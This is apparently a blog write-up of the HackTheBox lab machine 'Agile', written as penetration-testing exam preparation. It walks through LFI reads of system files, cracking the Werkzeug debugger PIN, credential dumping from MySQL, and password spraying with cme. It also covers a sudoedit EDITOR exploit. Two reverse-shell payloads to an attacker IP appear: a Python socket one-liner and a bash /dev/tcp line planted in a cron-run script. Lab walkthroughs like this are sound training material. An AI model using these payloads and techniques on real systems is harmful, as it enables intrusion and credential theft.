---
layout: post
title: "Agile"
date: 2025-04-18 19:32:13 +0100
categories: cpts preparation
---

# Attack Path

First enumerate the open ports and services:

```bash
sudo nmap -sC -sV -oA nmap/agile 10.129.228.212

result:
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f4:bc:ee:21:d7:1f:1a:a2:65:72:21:2d:5b:a6:f7:00 (ECDSA)
|_  256 65:c1:48:0d:88:cb:b9:75:a0:2c:a5:e6:37:7e:51:06 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://superpass.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We have the domain name. Let’s add that to /etc/hosts.

Let’s visit the site superpass.htb. Upon visiting, we get to a login form. Let’s try admin:admin. We get an error but it tells us what SQL query it used:

![agile-image.png]({{ site.baseurl }}/assets/agile/agile-image.png)

Let’s try some SQL injection:

```bash
sqlmap -r login.req --batch --risk 3 --level 5

#Let's not
```

At the same time, let’s run gobuster:

```bash
gobuster dir -u http://superpass.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

Let’s just register as a new user and login.

![agile-image.png]({{ site.baseurl }}/assets/agile/agile-image-1.png)

When we add a new password, it uses POST request to update. And when click on export, we get an option to download the csv password file. Looking at the request, it might be vulnerable to LFI:

![agile-image.png]({{ site.baseurl }}/assets/agile/agile-image-2.png)

Let’s try testing the parameter fn:

```bash
GET /download?fn=../../../../etc/passwd
```

![agile-image.png]({{ site.baseurl }}/assets/agile/agile-image-3.png)

```bash
The active users on the computer is:
runner:x:1001:1001::/app/app-testing/:/bin/sh
edwards:x:1002:1002::/home/edwards:/bin/bash
dev_admin:x:1003:1003::/home/dev_admin:/bin/bash
```

When error occurs, we realise it’s a Werkzeug debugger

![agile-image.png]({{ site.baseurl }}/assets/agile/agile-image-4.png)

![agile-image.png]({{ site.baseurl }}/assets/agile/agile-image-5.png)

Get the console by hovering over the error line and at the far right side there is a console button. We search werkzeug hacktricks to find an exploit and all the variables we need before the exploit. First save the python script to attack dir. 

The first var we need is the user who is running the app:

```bash
/download?fn=../proc/self/environ

result:
www-data
#now edit this on the python script and comment how we found it e.g. /proc/self/environ

#Next we need the modname
```

![agile-image.png]({{ site.baseurl }}/assets/agile/agile-image-6.png)

Research leads us to this blog https://www.bengrewell.com/cracking-flask-werkzeug-console-pin/ with this table:

```bash
Module Name Application Name
-------------------------------------
flask.app - wsgi_app
werkzeug.debug - DebuggedApplication
flask.app - Flask
```

Since it says wsgi_app let’s keep the variable as flask.app. Next we need the full path which is also revealed to us by the error above:

```bash
/app/venv/lib/python3.10/site-packages/flask/app.py
```

Let’s put that there. So public bits array will look like this

```bash
probably_public_bits = [
    'www-data',  # username /proc/self/environ
    'flask.app',  # modname
    'wsgi_app',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/app/venv/lib/python3.10/site-packages/flask/app.py'  # getattr(mod, '__file__', None),
]
```

Now to get the private bits. We need to grab the MAC address of the target system. 

```bash
/download?fn=../proc/net/arp

result:
IP address       HW type     Flags       HW address            Mask     Device
10.129.0.1       0x1         0x2         00:50:56:b9:f8:ec     *        eth0

As we can see in the output the device is called eth0 . Now we can proceed to read the MAC address from /sys/class/net/eth0/address

00:50:56:94:6b:d2

#We also need to convert the MAC address from hexadecimal to decimal. We can do it via python

python3 -c 'print(0x005056946bd2)'

result:
345049951186
```

Now we need to find the machine ID. The machine ID is a concatenation of two parts:

```bash
1. /proc/self/cgroup after the final /
0::/system.slice/superpass.service

superpass.service

2. value of /etc/machine-id 

ed5b159560f54721827644bc9b220d00

MachineID = ed5b159560f54721827644bc9b220d00superpass.service
```

Private bits:

```bash
private_bits = [
    '345049951186',  # str(uuid.getnode()),  /sys/class/net/ens33/address
    'ed5b159560f54721827644bc9b220d00superpass.service'  # get_machine_id(), /etc/machine-id
]

```

Now let’s run the script:

```bash
python3 get_pin.py

result:
823-292-062
```

Now we have access to the python console. Let’s create a reverse shell command:

```bash
import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.132",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh");
```

Now we have shell. Let’s upgrade our shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

After that let’s try and see what’s in the superpass’s mysql database. Let’s look at [app.py](http://app.py) and see if there are any config files loaded:

```bash
def load_config():                                                                                                                                        
    config_path = os.getenv("CONFIG_PATH")                                                                                                                
    with open(config_path, 'r') as f:                                                                                                                     
        for k, v in json.load(f).items():                                                                                                                 
            app.config[k] = v 
```

So let’s look at our environment variables:

```bash
env

result:
CONFIG_PATH=/app/config_prod.json

superpassuser:dSA6l7q*yIVs$39Ml6ywvgK
```

Let’s login to mysql

```bash
mysql -u superpassuser -p   #dSA6l7q*yIVs$39Ml6ywvgK

show databases;
use superpass;
show tables;
select * from users;

result:
+----+----------+--------------------------------------------------------------------------------------------------------------------------+
| id | username | hashed_password                                                                                                          |
+----+----------+--------------------------------------------------------------------------------------------------------------------------+
|  1 | 0xdf     | $6$rounds=200000$FRtvqJFfrU7DSyT7$8eGzz8Yk7vTVKudEiFBCL1T7O4bXl0.yJlzN0jp.q0choSIBfMqvxVIjdjzStZUYg6mSRB2Vep0qELyyr0fqF. |
|  2 | corum    | $6$rounds=200000$yRvGjY1MIzQelmMX$9273p66QtJQb9afrbAzugxVFaBhb9lyhp62cirpxJEOfmIlCy/LILzFxsyWj/mZwubzWylr3iaQ13e4zmfFfB1 |
|  9 | bob      | $6$rounds=200000$x4zE7pz5uXVRjCu4$a94iTI2Z7/6oZLnbWoovaG3z3udiieKpkF/FQQvkefsScyNdsiOHZrZAzZCW0x7zYTCBCeZaDoaCCge8b885A1 |

select * from passwords;

+----+---------------------+---------------------+----------------+----------+----------------------+---------+
| id | created_date        | last_updated_data   | url            | username | password             | user_id |
+----+---------------------+---------------------+----------------+----------+----------------------+---------+
|  3 | 2022-12-02 21:21:32 | 2022-12-02 21:21:32 | hackthebox.com | 0xdf     | 762b430d32eea2f12970 |       1 |
|  4 | 2022-12-02 21:22:55 | 2022-12-02 21:22:55 | mgoblog.com    | 0xdf     | 5b133f7a6a1c180646cb |       1 |
|  6 | 2022-12-02 21:24:44 | 2022-12-02 21:24:44 | mgoblog        | corum    | 47ed1e73c955de230a1d |       2 |
|  7 | 2022-12-02 21:25:15 | 2022-12-02 21:25:15 | ticketmaster   | corum    | 9799588839ed0f98c211 |       2 |
|  8 | 2022-12-02 21:25:27 | 2022-12-02 21:25:27 | agile          | corum    | 5db7caa1d13cc37c9fc2 |       2 |
+----+---------------------+---------------------+----------------+----------+----------------------+---------+

```

We can create a users.txt and password.txt file to see which password logs us in:

user.txt:

```bash
0xdf
0xdf
corum
corum
corum
```

password.txt:

```bash
762b430d32eea2f12970
5b133f7a6a1c180646cb
47ed1e73c955de230a1d
9799588839ed0f98c211
5db7caa1d13cc37c9fc2
```

Now we can use cme to check which password is valid to log on to ssh:

```bash
cme ssh 10.129.228.212 -u user.txt -p password.txt --no-bruteforce #nobrutefoce matches the user to password line by line

result:
SSH         10.129.228.212  22     10.129.228.212   [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1
SSH         10.129.228.212  22     10.129.228.212   [-] 0xdf:762b430d32eea2f12970 Authentication failed.
SSH         10.129.228.212  22     10.129.228.212   [-] 0xdf:5b133f7a6a1c180646cb Authentication failed.
SSH         10.129.228.212  22     10.129.228.212   [-] corum:47ed1e73c955de230a1d Authentication failed.
SSH         10.129.228.212  22     10.129.228.212   [-] corum:9799588839ed0f98c211 Authentication failed.
SSH         10.129.228.212  22     10.129.228.212   [+] corum:5db7caa1d13cc37c9fc2 
```

Now let’s ssh with corum:

```bash
ssh corum@10.129.228.212
```

Now try and escalate our privileges. First check sudo privileges:

```bash
sudo -l

#we have none. 

#Let's check for running processes
ps aux

OR

ps -ef --forest

result:
root        4239     990  0 17:50 ?        00:00:00  \_ /usr/sbin/CRON -f -P                                                                              
runner      4242    4239  0 17:50 ?        00:00:00      \_ /bin/sh -c /app/test_and_update.sh                                                            
runner      4245    4242  0 17:50 ?        00:00:00          \_ /bin/bash /app/test_and_update.sh                                                         
runner      4250    4245  0 17:50 ?        00:00:00              \_ /app/venv/bin/python3 /app/venv/bin/pytest -x                                         
runner      4251    4250  0 17:50 ?        00:00:00                  \_ chromedriver --port=59529                                                         
runner      4257    4251  0 17:50 ?        00:00:00                      \_ /usr/bin/google-chrome --allow-pre-commit-input --crash-dumps-dir=/tmp --disab
runner      4261    4257  0 17:50 ?        00:00:00                          \_ cat                                                                       
runner      4262    4257  0 17:50 ?        00:00:00                          \_ cat                                                                       
runner      4269    4257  0 17:50 ?        00:00:00                          \_ /opt/google/chrome/chrome --type=zygote --no-zygote-sandbox --enable-loggi
runner      4292    4269  0 17:50 ?        00:00:00                          |   \_ /opt/google/chrome/chrome --type=gpu-process --enable-logging --headle
runner      4270    4257  0 17:50 ?        00:00:00                          \_ /opt/google/chrome/chrome --type=zygote --enable-logging --headless --log-
runner      4272    4270  0 17:50 ?        00:00:00                          |   \_ /opt/google/chrome/chrome --type=zygote --enable-logging --headless --
runner      4321    4272  0 17:50 ?        00:00:01                          |       \_ /opt/google/chrome/chrome --type=renderer --headless --crashpad-ha
runner      4293    4257  0 17:50 ?        00:00:00                          \_ /opt/google/chrome/chrome --type=utility --utility-sub-type=network.mojom.

www-data    1069       1  0 16:10 ?        00:00:00 /app/venv/bin/python3 /app/venv/bin/gunicorn --bind 127.0.0.1:5000 --threads=10 --timeout 600 wsgi:app
www-data    1073    1069  0 16:10 ?        00:00:53  \_ /app/venv/bin/python3 /app/venv/bin/gunicorn --bind 127.0.0.1:5000 --threads=10 --timeout 600 wsgi
www-data    3261    1073  0 17:19 pts/0    00:00:00      \_ /bin/sh
www-data    3277    3261  0 17:20 pts/0    00:00:00          \_ python3 -c import pty; pty.spawn("/bin/bash")
www-data    3278    3277  0 17:20 pts/1    00:00:00              \_ /bin/bash 
www-data    3680    3278  0 17:34 pts/1    00:00:00                  \_ mysql -u superpassuser -p
runner      1071       1  0 16:10 ?        00:00:00 /app/venv/bin/python3 /app/venv/bin/gunicorn --bind 127.0.0.1:5555 wsgi-dev:app
runner      1072    1071  0 16:10 ?        00:00:03  \_ /app/venv/bin/python3 /app/venv/bin/gunicorn --bind 127.0.0.1:5555 wsgi-dev:app

runner      4264       1  0 17:50 ?        00:00:00 /opt/google/chrome/chrome_crashpad_handler --monitor-self-annotation=ptype=crashpad-handler --database
```

There’s 2 python application running, one on 5000,  one on  5555, we know 5000 is us as we can see the reverse shell command. Let’s look into it:

```bash
grep 5555 /etc/ -R

result:
/etc/nginx/sites-available/superpass-test.nginx:        proxy_pass http://127.0.0.1:5555;

```

Let’s see what’s in the file:

```bash
result:
server {
    listen 127.0.0.1:80;
    server_name test.superpass.htb;

    location /static {
        alias /app/app-testing/superpass/static;
        expires 365d;
    }
    location / {
        include uwsgi_params;
        proxy_pass http://127.0.0.1:5555;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-Protocol $scheme;
    }
}
```

This confirms another website running on port 5555. Let’s see what the test_and_update.sh is running:

```bash
#!/bin/bash

# update prod with latest from testing constantly assuming tests are passing

echo "Starting test_and_update"
date

# if already running, exit
ps auxww | grep -v "grep" | grep -q "pytest" && exit

echo "Not already running. Starting..."

# start in dev folder
cd /app/app-testing

# system-wide source doesn't seem to happen in cron jobs
source /app/venv/bin/activate

# run tests, exit if failure
pytest -x 2>&1 >/dev/null || exit

# tests good, update prod (flask debug mode will load it instantly)
cp -r superpass /app/app/
echo "Complete!"

```

We see a it starts venv in folder /app/app-testing. Let’s see what’s in that folder. In the /app/app-testing/tests/functional folder we find a test_site_interactively.py which reveals to us:

```bash
def driver():
    options = Options()
    #options.add_argument("--no-sandbox")
    options.add_argument("--window-size=1420,1080")
    options.add_argument("--headless")
    options.add_argument("--remote-debugging-port=41829")
    options.add_argument('--disable-gpu')
    options.add_argument('--crash-dumps-dir=/tmp')
    driver = webdriver.Chrome(options=options)
    yield driver
    driver.close()

```

This means there is a debugging service on port 41829.  We can verify that with:

```bash
ps -ef | grep runner

result:
runner     43251   43201  0 15:50 ?        00:00:01 /opt/google/chrome/chrome --type=renderer --headless --crashpad-handler-pid=43193 --lang=en-US --enable-automation --enable-logging --log-level=0 --remote-debugging-port=41829 --test-type=webdriver
```

Now let’s set up local port forwarding. Press enter in the shell and quickly ~ + C. Now type:

```bash
-L 41829:127.0.0.1:41829
#If this does not work just log out and login with:

ssh -L 41829:127.0.0.1:41829 corum@10.129.228.212

#To verify, open another shell on attack host and:
ss -lntp | grep 41829   

result:
LISTEN 0      128             127.0.0.1:41829      0.0.0.0:*    users:(("ssh",pid=23486,fd=5))
LISTEN 0      128                 [::1]:41829         [::]:*    users:(("ssh",pid=23486,fd=4))

```

Now let’s visit with chromium as that’s what the target was using.

Then on the URL field type:

```bash
chrome://inspect

Then click on configure
```

![agile-image.png]({{ site.baseurl }}/assets/agile/agile-image-7.png)

Now click on inspect to see. Click on Vault and we can see the password. We can either copy the cookies so we can obtain the session as log on as dev or simply copy the password from here

![agile-image.png]({{ site.baseurl }}/assets/agile/agile-image-8.png)

![agile-image.png]({{ site.baseurl }}/assets/agile/agile-image-9.png)

We can verify if the password works with cme:

```bash
cme ssh 10.129.228.212 -u edwards -p d07867c6267dcb5df0af

#It's correct.
```

Let’s ssh to edwards.

```bash
ssh edwards@10.129.228.212
```

Checking our sudo privileges:

```bash
sudo -l

result:
User edwards may run the following commands on agile:
    (dev_admin : dev_admin) sudoedit /app/config_test.json
    (dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt
```

Let’s look at both files.

```bash
sudo -u dev_admin sudoedit /app/config_test.json

result:
{
    "SQL_URI": "mysql+pymysql://superpasstester:VUO8A2c2#3FnLq3*a9DX1U@localhost/superpasstest"
}

#Mysql database for the runnning website, since we already have edwards password it's not that useful. We check the database and find nothing new. The other file:

sudo -u dev_admin sudoedit /app/app-testing/tests/functional/creds.txt

result:
edwards:1d7ffjwrx#$d6qn!9nndqgde4
```

We try whether that’s the root’s password but it’s not. We can run sudoedit as user dev_admin so let’s see what files dev_admin owns (group and user):

```bash
find / -user dev_admin 2>/dev/null

result:
/home/dev_admin
/app/app-testing/tests/functional/creds.txt
/app/config_test.json
/app/config_prod.json

#Nothing interesting

find / -group dev_admin 2>/dev/null

result:
/home/dev_admin
/app/venv
/app/venv/bin
/app/venv/bin/activate
/app/venv/bin/Activate.ps1
/app/venv/bin/activate.fish
/app/venv/bin/activate.csh
```

It seems we have ownership of /app/venv/bin/activate. From before, in the file /app/test_and_update.sh we know that root runs this periodically as cron job and in the file, /app/venv/bin/activate gets ran. Let’s search up sudoedit (Sudo version 1.9.9) vulnerabilties: https://www.exploit-db.com/exploits/51217. It seems we can set a variable EDITOR then execute the command we are allowed, but in reality changing the file in EDITOR; so we can edit /app/venv/bin/activate and put a reverse shell:

```bash
ls -l /app/venv/bin/activate

result:
-rw-rw-r-- 1 root dev_admin 1976 Dec 10 16:21 /app/venv/bin/activate

#we have confirmed we have permission to edit.

sudo -u dev_admin sudoedit /app/venv/bin/activate

EDITOR="vim -- /app/venv/bin/activate" sudoedit -u dev_admin /app/app-testing/tests/functional/creds.txt

#Now add this in the file:
bash -c 'bash -i >& /dev/tcp/10.10.14.132/9001 0>&1'

#Now save it with Esc, :wq!
```

We now have root shell.

- LFI vuln
- werkzeug console and debugger
- LFI vuln to find private/public bits
- reverse shell with werkzeug console
- mysql credentials in config file
- cme verify passwords
- ps -ef check processes
- checking more config files
- port forwarding
- chromium
- sudo -l
- finding CVE on sudoedit
- understand exploit to use for different purpose